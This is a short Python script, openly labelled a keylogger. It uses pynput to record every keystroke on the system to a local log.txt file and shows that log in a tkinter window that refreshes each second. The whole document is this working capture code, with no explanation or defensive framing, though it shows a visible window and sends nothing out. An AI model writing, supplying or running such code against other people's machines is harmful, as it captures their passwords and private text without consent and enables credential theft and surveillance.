#start of the code

import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from pynput.keyboard import Listener
import threading
import time


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("600x400")

        self.text_area = ScrolledText(self.root, wrap=tk.WORD, font=("Helvetica", 12))
        self.text_area.pack(expand=True, fill=tk.BOTH)

        self.update_log_contents()

    def update_log_contents(self):
        with open("log.txt", 'r') as f:
            log_contents = f.read()
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(tk.END, log_contents)
        self.root.after(1000, self.update_log_contents)


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)


def start_keylogger():
    with Listener(on_press=write_to_file) as listener:
        listener.join()


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)

    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    root.mainloop()

#end of the code